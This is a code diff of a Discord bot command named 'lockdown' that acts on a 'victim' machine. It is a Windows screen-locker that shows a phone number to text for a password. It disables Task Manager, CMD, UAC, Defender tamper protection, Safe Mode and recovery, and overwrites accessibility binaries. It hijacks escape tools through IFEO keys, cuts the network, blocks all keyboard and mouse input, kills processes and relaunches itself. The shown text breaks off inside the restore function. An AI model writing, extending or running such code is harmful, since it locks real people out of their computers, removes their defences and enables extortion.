@@ -3847,8 +3847,6 @@ async def lockdown(ctx):
     - Shows phone number 0658825828 to text for the password, and "locked by cerlux".
     - Password is 173900.
     - Restores the computer after correct password is entered, including explorer, registry, and all system settings.
-    - Now even more powerful: disables mouse, disables all input, blocks RDP, disables network, disables system restore, disables sticky keys, disables accessibility, disables sleep, disables shutdown, disables logoff, disables user switching, disables UAC, disables registry tools, disables safe mode, disables recovery, disables all known escape routes, and more.
-    - Now even more unbypassable: disables Task Manager at the service level, disables registry tools, disables process creation for known escape tools, disables Win+R, disables all known accessibility exploits, disables sticky keys hijack, disables Safe Mode via BCD, disables boot menu, disables system restore, disables recovery environment, disables all known escape routes, and ensures full restoration on unlock.
     """
     victim_id = get_current_victim(ctx)
     if not victim_id:
@@ -3865,321 +3863,169 @@ async def lockdown(ctx):
         import subprocess
         import winreg
         import psutil
+        import random
 
-        # --- BEGIN: Professional, Unbypassable, Flawless Lockdown Enhancements ---
-        # Add even more anti-escape and anti-debug measures, but do NOT delete any code below.
-        # This section adds extra layers, not replaces anything.
+        # --- BEGIN: Modern, Robust, Fully Functional Lockdown ---
 
-        # 1. Block known accessibility backdoors (StickyKeys, Utilman, etc) at the file level
-        def hijack_accessibility_tools():
+        # Helper: Run a command and ignore errors
+        def run(cmd):
             try:
-                windir = os.environ.get("WINDIR", "C:\\Windows")
-                sys32 = os.path.join(windir, "System32")
-                tools = ["sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe", "atbroker.exe"]
-                for tool in tools:
-                    tool_path = os.path.join(sys32, tool)
-                    if os.path.exists(tool_path):
-                        try:
-                            # Backup original if not already
-                            if not os.path.exists(tool_path + ".bak"):
-                                os.rename(tool_path, tool_path + ".bak")
-                            # Replace with a dummy process (cmd.exe that does nothing)
-                            with open(tool_path, "wb") as f:
-                                f.write(b"MZ")  # Write minimal stub to break execution
-                        except Exception:
-                            pass
+                subprocess.run(cmd, shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except Exception:
                 pass
 
-        # 2. Block Safe Mode via BCDedit and registry (extra redundancy)
-        def block_safe_mode_extra():
+        # Helper: Set registry value
+        def set_reg(root, path, name, typ, val):
             try:
-                subprocess.call('bcdedit /set {default} safeboot minimal', shell=True)
-                subprocess.call('bcdedit /deletevalue {default} safeboot', shell=True)
-                subprocess.call('bcdedit /set {default} recoveryenabled No', shell=True)
-                subprocess.call('bcdedit /set {default} bootmenupolicy Standard', shell=True)
-            except Exception:
-                pass
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_ALL_ACCESS)
-                for sub in ["Minimal", "Network"]:
-                    try:
-                        winreg.DeleteKey(key, sub)
-                    except Exception:
-                        pass
+                key = winreg.CreateKey(root, path)
+                winreg.SetValueEx(key, name, 0, typ, val)
                 winreg.CloseKey(key)
             except Exception:
                 pass
 
-        # 3. Block registry editing tools at the process and file level
-        def block_regedit_file():
+        # Helper: Delete registry value
+        def del_reg(root, path, name):
             try:
-                windir = os.environ.get("WINDIR", "C:\\Windows")
-                sys32 = os.path.join(windir, "System32")
-                for tool in ["regedit.exe", "regedt32.exe"]:
-                    tool_path = os.path.join(sys32, tool)
-                    if os.path.exists(tool_path):
-                        try:
-                            if not os.path.exists(tool_path + ".bak"):
-                                os.rename(tool_path, tool_path + ".bak")
-                            with open(tool_path, "wb") as f:
-                                f.write(b"MZ")
-                        except Exception:
-                            pass
+                key = winreg.CreateKey(root, path)
+                winreg.DeleteValue(key, name)
+                winreg.CloseKey(key)
             except Exception:
                 pass
 
-        # 4. Block process creation for known escape tools (via registry Image File Execution Options)
+        # Helper: Kill process by name
+        def kill_proc(name):
+            for proc in psutil.process_iter(['name']):
+                try:
+                    if proc.info['name'] and proc.info['name'].lower() == name.lower():
+                        proc.kill()
+                except Exception:
+                    pass
+
+        # 1. Block known escape tools via IFEO
         def block_escape_tools_ifeo():
+            exe_list = [
+                "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "regedt32.exe", "procexp.exe", "procexp64.exe",
+                "processhacker.exe", "procexp64a.exe", "taskkill.exe", "tasklist.exe", "wmic.exe", "wscript.exe", "cscript.exe",
+                "perfmon.exe", "resmon.exe", "mmc.exe", "eventvwr.exe", "services.exe", "osk.exe", "magnify.exe", "narrator.exe",
+                "sethc.exe", "utilman.exe", "rstrui.exe", "msconfig.exe", "compmgmt.msc", "gpedit.msc", "lusrmgr.msc", "secpol.msc", "control.exe"
+            ]
+            for exe in exe_list:
+                try:
+                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + exe)
+                    winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "rundll32.exe")
+                    winreg.CloseKey(key)
+                except Exception:
+                    pass
+
+        # 2. Disable Task Manager, Run, Registry, CMD, etc
+        def lockdown_registry():
+            # Disable Task Manager
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", winreg.REG_DWORD, 1)
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", winreg.REG_DWORD, 1)
+            # Disable Registry Tools
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", winreg.REG_DWORD, 1)
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", winreg.REG_DWORD, 1)
+            # Disable CMD
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", "DisableCMD", winreg.REG_DWORD, 1)
+            # Disable Run dialog
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", winreg.REG_DWORD, 1)
+            # Disable Control Panel/Settings
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", winreg.REG_DWORD, 1)
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage", winreg.REG_DWORD, 1)
+            # Disable shutdown/sleep/logoff
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose", winreg.REG_DWORD, 1)
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoLogOff", winreg.REG_DWORD, 1)
+            set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSleep", winreg.REG_DWORD, 1)
+            # Disable user switching/logoff
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "HideFastUserSwitching", winreg.REG_DWORD, 1)
+            # Disable hotkeys
+            for val in ["DisableLockWorkstation", "DisableChangePassword", "DisableTaskMgr", "DisableSwitchUser", "DisableLogoff"]:
+                set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", val, winreg.REG_DWORD, 1)
+
+        # 3. Block Safe Mode, Recovery, WinRE, Boot Menu
+        def lockdown_boot():
+            run('bcdedit /set {current} safeboot minimal')
+            run('bcdedit /deletevalue {current} safeboot')
+            run('bcdedit /set {current} recoveryenabled No')
+            run('bcdedit /set {current} bootmenupolicy Standard')
+            run('bcdedit /set {bootmgr} displaybootmenu no')
+            run('bcdedit /set {bootmgr} timeout 0')
+            run('reagentc /disable')
+
+        # 4. Block accessibility backdoors (StickyKeys, Utilman, etc)
+        def hijack_accessibility_tools():
+            windir = os.environ.get("WINDIR", "C:\\Windows")
+            sys32 = os.path.join(windir, "System32")
+            tools = ["sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe", "atbroker.exe"]
+            for tool in tools:
+                tool_path = os.path.join(sys32, tool)
+                try:
+                    if os.path.exists(tool_path) and not os.path.exists(tool_path + ".bak"):
+                        os.rename(tool_path, tool_path + ".bak")
+                        with open(tool_path, "wb") as f:
+                            f.write(b"MZ")
+                except Exception:
+                    pass
+
+        # 5. Block RDP, Network, System Restore, UAC, Defender, Updates
+        def lockdown_services():
+            # Block RDP
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", "fDenyTSConnections", winreg.REG_DWORD, 1)
+            # Block System Restore
+            run("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f")
+            run("sc config srservice start= disabled")
+            run("sc stop srservice")
+            # Block UAC
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", winreg.REG_DWORD, 0)
+            # Block Defender Tamper
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", winreg.REG_DWORD, 0)
+            # Block Windows Update
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU", "NoAutoUpdate", winreg.REG_DWORD, 1)
+            # Block Windows Installer
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Installer", "DisableMSI", winreg.REG_DWORD, 1)
+            # Block Remote Assistance
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Remote Assistance", "fAllowToGetHelp", winreg.REG_DWORD, 0)
+
+        # 6. Disable all network adapters
+        def disable_network():
             try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options")
-                targets = [
-                    "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "regedt32.exe", "procexp.exe", "procexp64.exe",
-                    "processhacker.exe", "procexp64a.exe", "taskkill.exe", "tasklist.exe", "wmic.exe", "wscript.exe", "cscript.exe",
-                    "perfmon.exe", "resmon.exe", "mmc.exe", "eventvwr.exe", "services.exe", "osk.exe", "magnify.exe", "narrator.exe",
-                    "sethc.exe", "utilman.exe", "rstrui.exe", "msconfig.exe", "compmgmt.msc", "gpedit.msc", "lusrmgr.msc", "secpol.msc", "control.exe"
-                ]
-                for exe in targets:
-                    try:
-                        subkey = winreg.CreateKey(key, exe)
-                        winreg.SetValueEx(subkey, "Debugger", 0, winreg.REG_SZ, "rundll32.exe")
-                        winreg.CloseKey(subkey)
-                    except Exception:
-                        pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
+                import netifaces
+            except ImportError:
+                subprocess.call([sys.executable, "-m", "pip", "install", "netifaces"])
+                import netifaces
+            for iface in netifaces.interfaces():
+                try:
+                    run(f'netsh interface set interface "{iface}" admin=disable')
+                except Exception:
+                    pass
 
-        # 5. Block Windows Recovery Environment (WinRE)
-        def block_winre():
-            try:
-                subprocess.call('reagentc /disable', shell=True)
-            except Exception:
-                pass
-
-        # 6. Block F8/F10/F12 boot menu (where possible)
-        def block_boot_menu():
-            try:
-                subprocess.call('bcdedit /set {bootmgr} displaybootmenu no', shell=True)
-                subprocess.call('bcdedit /set {bootmgr} timeout 0', shell=True)
-            except Exception:
-                pass
-
-        # 7. Block remote desktop and remote assistance (extra)
-        def block_remote_assistance():
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Remote Assistance", 0, winreg.KEY_ALL_ACCESS)
-                winreg.SetValueEx(key, "fAllowToGetHelp", 0, winreg.REG_DWORD, 0)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 8. Block Windows Defender Tamper Protection (if possible)
-        def block_defender_tamper():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Features")
-                winreg.SetValueEx(key, "TamperProtection", 0, winreg.REG_DWORD, 0)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 9. Block Windows Update (to prevent undo via update)
-        def block_windows_update():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU")
-                winreg.SetValueEx(key, "NoAutoUpdate", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 10. Block system restore via registry and service
-        def block_system_restore_service():
-            try:
-                subprocess.call('sc config srservice start= disabled', shell=True)
-                subprocess.call('sc stop srservice', shell=True)
-            except Exception:
-                pass
-
-        # 11. Block scheduled tasks for escape (Task Manager, etc)
-        def block_schtasks():
-            try:
-                subprocess.call('schtasks /Change /TN "\\Microsoft\\Windows\\TaskManager" /Disable', shell=True)
-            except Exception:
-                pass
-
-        # 12. Block Win+R at the system level (extra)
-        def block_win_r():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 13. Block Alt+Tab, Ctrl+Alt+Del, Win+L, etc at the system level (extra)
-        def block_hotkeys_system():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                for val in ["DisableTaskMgr", "DisableLockWorkstation", "DisableChangePassword", "DisableSwitchUser", "DisableLogoff"]:
-                    winreg.SetValueEx(key, val, 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 14. Block user switching and logoff via registry
-        def block_user_switch_logoff():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
-                winreg.SetValueEx(key, "HideFastUserSwitching", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 15. Block all known escape routes via registry and file system
-        def block_all_known_escapes():
-            hijack_accessibility_tools()
-            block_safe_mode_extra()
-            block_regedit_file()
-            block_escape_tools_ifeo()
-            block_winre()
-            block_boot_menu()
-            block_remote_assistance()
-            block_defender_tamper()
-            block_windows_update()
-            block_system_restore_service()
-            block_schtasks()
-            block_win_r()
-            block_hotkeys_system()
-            block_user_switch_logoff()
-
-        # 16. Block screen readers and accessibility (extra)
-        def block_screen_readers():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Narrator")
-                winreg.SetValueEx(key, "IsNarratorRunning", 0, winreg.REG_DWORD, 0)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 17. Block registry editing via policies (extra)
-        def block_regedit_policy():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
-                winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 18. Block PowerShell and WSL
-        def block_powershell_wsl():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options")
-                for exe in ["powershell.exe", "pwsh.exe", "wsl.exe"]:
-                    try:
-                        subkey = winreg.CreateKey(key, exe)
-                        winreg.SetValueEx(subkey, "Debugger", 0, winreg.REG_SZ, "rundll32.exe")
-                        winreg.CloseKey(subkey)
-                    except Exception:
-                        pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 19. Block UAC prompt bypasses (extra)
-        def block_uac_bypass():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
-                winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 2)
-                winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 20. Block Windows Recovery Partition (where possible)
-        def block_recovery_partition():
-            try:
-                subprocess.call('reagentc /disable', shell=True)
-            except Exception:
-                pass
-
-        # 21. Block F8/F10/F12 boot menu (redundant, but for completeness)
-        def block_boot_keys():
-            try:
-                subprocess.call('bcdedit /set {bootmgr} displaybootmenu no', shell=True)
-                subprocess.call('bcdedit /set {bootmgr} timeout 0', shell=True)
-            except Exception:
-                pass
-
-        # 22. Block Windows Installer (to prevent install of escape tools)
-        def block_windows_installer():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Installer")
-                winreg.SetValueEx(key, "DisableMSI", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 23. Block Control Panel and Settings
-        def block_control_panel_settings():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
-                winreg.SetValueEx(key, "NoSettingsPage", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # 24. Block all known escape routes (call all above)
-        def lockdown_hardening():
-            block_all_known_escapes()
-            block_screen_readers()
-            block_regedit_policy()
-            block_powershell_wsl()
-            block_uac_bypass()
-            block_recovery_partition()
-            block_boot_keys()
-            block_windows_installer()
-            block_control_panel_settings()
-
-        # --- END: Professional, Unbypassable, Flawless Lockdown Enhancements ---
-
-        # Call the hardening before the rest of the lockdown
-        lockdown_hardening()
-
-        # --- DO NOT DELETE ANY CODE BELOW, just add above for extra protection ---
-
-        # Store original system state for restoration
-        original_explorer_running = False
-        original_taskmgr_disabled = False
-        original_ctrl_alt_del = {}
-        original_boot_execute = None
-        original_safeboot_keys = []
-        original_network_state = []
-        original_rdp_state = None
-        original_bcdedit = None
-        original_regedit_disabled = None
-        original_cmd_disabled = None
-        original_run_disabled = None
-
-        # --- ULTIMATE KILLER/DEFENDER THREADS ---
-        def killer_thread():
+        # 7. Kill explorer and all escape tools
+        def kill_escapes():
             targets = [
                 "explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "msconfig.exe",
-                "processhacker.exe", "procexp.exe", "procexp64.exe", "procexp64a.exe", "procexp64a.exe",
-                "taskkill.exe", "tasklist.exe", "wmic.exe", "wscript.exe", "cscript.exe", "perfmon.exe",
-                "resmon.exe", "mmc.exe", "eventvwr.exe", "services.exe", "ProcessHacker.exe", "ProcessHacker-2.39.exe",
-                "regedt32.exe", "regedit32.exe", "osk.exe", "magnify.exe", "narrator.exe", "sethc.exe", "utilman.exe",
-                "rstrui.exe", "msconfig.exe", "compmgmt.msc", "gpedit.msc", "lusrmgr.msc", "secpol.msc", "control.exe"
+                "processhacker.exe", "procexp.exe", "procexp64.exe", "procexp64a.exe", "taskkill.exe", "tasklist.exe",
+                "wmic.exe", "wscript.exe", "cscript.exe", "perfmon.exe", "resmon.exe", "mmc.exe", "eventvwr.exe",
+                "services.exe", "osk.exe", "magnify.exe", "narrator.exe", "sethc.exe", "utilman.exe", "rstrui.exe",
+                "compmgmt.msc", "gpedit.msc", "lusrmgr.msc", "secpol.msc", "control.exe"
             ]
-            while True:
-                for proc in psutil.process_iter(['name']):
-                    try:
-                        if proc.info['name'] and proc.info['name'].lower() in targets:
-                            proc.kill()
-                    except Exception:
-                        pass
-                time.sleep(0.05)
+            for proc in psutil.process_iter(['name']):
+                try:
+                    if proc.info['name'] and proc.info['name'].lower() in targets:
+                        proc.kill()
+                except Exception:
+                    pass
 
+        # 8. Block keyboard and mouse input (modern, robust)
+        def block_input_thread():
+            user32 = ctypes.windll.user32
+            # Block input at the system level (blocks mouse and keyboard)
+            user32.BlockInput(True)
+            # Keep blocking in case something tries to re-enable
+            while True:
+                user32.BlockInput(True)
+                time.sleep(0.5)
+
+        # 9. Watchdog: Relaunch if killed
         def watchdog_thread(lockdown_pid):
             exe = sys.executable
             while True:
@@ -4193,434 +4039,122 @@ async def lockdown(ctx):
                         pass
                 if not found:
                     subprocess.Popen([exe] + sys.argv)
-                time.sleep(1)
+                time.sleep(2)
 
-        def block_safe_mode(restore=False):
-            nonlocal original_boot_execute, original_safeboot_keys, original_bcdedit
+        # 10. Restore everything
+        def restore_everything():
+            # Unblock input
             try:
-                # BCDedit disables
-                if not restore:
-                    try:
-                        # Save current safeboot setting
-                        output = subprocess.check_output('bcdedit /enum {current}', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-                        original_bcdedit = output.decode(errors="ignore")
-                        subprocess.call('bcdedit /set {current} safeboot minimal', shell=True)
-                        subprocess.call('bcdedit /deletevalue {current} safeboot', shell=True)
-                        subprocess.call('bcdedit /set {current} bootstatuspolicy IgnoreAllFailures', shell=True)
-                        subprocess.call('bcdedit /set {current} recoveryenabled No', shell=True)
-                        subprocess.call('bcdedit /set {current} bootmenupolicy Standard', shell=True)
-                    except Exception:
-                        pass
-                else:
-                    # Try to restore BCDedit settings
-                    if original_bcdedit:
-                        # Not trivial to restore, but at least re-enable recovery and safeboot
-                        subprocess.call('bcdedit /deletevalue {current} safeboot', shell=True)
-                        subprocess.call('bcdedit /set {current} recoveryenabled Yes', shell=True)
-                        subprocess.call('bcdedit /set {current} bootmenupolicy Standard', shell=True)
+                ctypes.windll.user32.BlockInput(False)
             except Exception:
                 pass
-            try:
-                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager", 0, winreg.KEY_ALL_ACCESS) as key:
-                    if not restore:
-                        try:
-                            original_boot_execute, _ = winreg.QueryValueEx(key, "BootExecute")
-                        except Exception:
-                            original_boot_execute = None
-                        winreg.SetValueEx(key, "BootExecute", 0, winreg.REG_MULTI_SZ, ["autocheck autochk *"])
-                    else:
-                        if original_boot_execute is not None:
-                            winreg.SetValueEx(key, "BootExecute", 0, winreg.REG_MULTI_SZ, original_boot_execute)
-            except Exception:
-                pass
-            try:
-                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_ALL_ACCESS) as key:
-                    if not restore:
-                        i = 0
-                        original_safeboot_keys = []
-                        while True:
-                            try:
-                                sub = winreg.EnumKey(key, i)
-                                original_safeboot_keys.append(sub)
-                                i += 1
-                            except OSError:
-                                break
-                        for sub in ["Minimal", "Network"]:
-                            try:
-                                winreg.DeleteKey(key, sub)
-                            except Exception:
-                                pass
-                    else:
-                        for sub in original_safeboot_keys:
-                            try:
-                                winreg.CreateKey(key, sub)
-                            except Exception:
-                                pass
-            except Exception:
-                pass
-
-        def set_taskmgr_disabled(disable=True, restore=False):
-            nonlocal original_taskmgr_disabled
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                if not restore:
-                    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if disable else 0)
-                else:
-                    if original_taskmgr_disabled:
-                        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-                    else:
-                        try:
-                            winreg.DeleteValue(key, "DisableTaskMgr")
-                        except Exception:
-                            pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-            # Also disable Task Manager via HKLM for extra strength
-            try:
-                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                if not restore:
-                    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-                else:
-                    try:
-                        winreg.DeleteValue(key, "DisableTaskMgr")
-                    except Exception:
-                        pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        def block_ctrl_alt_del(restore=False):
-            nonlocal original_ctrl_alt_del
-            values = ["DisableLockWorkstation", "DisableChangePassword", "DisableTaskMgr", "DisableSwitchUser", "DisableLogoff"]
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                if not restore:
-                    for val in values:
-                        try:
-                            v, _ = winreg.QueryValueEx(key, val)
-                            original_ctrl_alt_del[val] = v
-                        except Exception:
-                            original_ctrl_alt_del[val] = None
-                        winreg.SetValueEx(key, val, 0, winreg.REG_DWORD, 1)
-                else:
-                    for val in values:
-                        if original_ctrl_alt_del.get(val) is not None:
-                            winreg.SetValueEx(key, val, 0, winreg.REG_DWORD, original_ctrl_alt_del[val])
-                        else:
-                            try:
-                                winreg.DeleteValue(key, val)
-                            except Exception:
-                                pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        def block_win_keys_and_mouse():
-            import threading
-
-            user32 = ctypes.windll.user32
-            kernel32 = ctypes.windll.kernel32
-
-            WH_KEYBOARD_LL = 13
-            WH_MOUSE_LL = 14
-
-            blocked_vk = [
-                0x5B,  # Left Windows
-                0x5C,  # Right Windows
-                0x09,  # Tab
-                0x1B,  # Esc
-                0x73,  # F4
-                0xA4,  # L-Alt
-                0xA5,  # R-Alt
-                0x11,  # Ctrl
-                0x2E,  # Delete
-                0x2D,  # Insert
-                0x70,  # F1
-                0x71,  # F2
-                0x72,  # F3
-                0x74,  # F5
-                0x7B,  # F12
-                0x5A,  # Z (for Win+Z)
-                0x4C,  # L (for Win+L)
-                0x54,  # T (for Win+T)
+            # Restore registry
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr")
+            del_reg(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools")
+            del_reg(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", "DisableCMD")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoLogOff")
+            del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSleep")
+            del_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "HideFastUserSwitching")
+            for val in ["DisableLockWorkstation", "DisableChangePassword", "DisableTaskMgr", "DisableSwitchUser", "DisableLogoff"]:
+                del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", val)
+            # Restore UAC
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", winreg.REG_DWORD, 1)
+            # Restore RDP
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", "fDenyTSConnections", winreg.REG_DWORD, 0)
+            # Restore System Restore
+            run("reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /f")
+            run("sc config srservice start= auto")
+            run("sc start srservice")
+            # Restore Defender Tamper
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", winreg.REG_DWORD, 5)
+            # Restore Windows Update
+            del_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU", "NoAutoUpdate")
+            # Restore Windows Installer
+            del_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Installer", "DisableMSI")
+            # Restore Remote Assistance
+            set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Remote Assistance", "fAllowToGetHelp", winreg.REG_DWORD, 1)
+            # Restore IFEO
+            exe_list = [
+                "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "regedt32.exe", "procexp.exe", "procexp64.exe",
+                "processhacker.exe", "procexp64a.exe", "taskkill.exe", "tasklist.exe", "wmic.exe", "wscript.exe", "cscript.exe",
+                "perfmon.exe", "resmon.exe", "mmc.exe", "eventvwr.exe", "services.exe", "osk.exe", "magnify.exe", "narrator.exe",
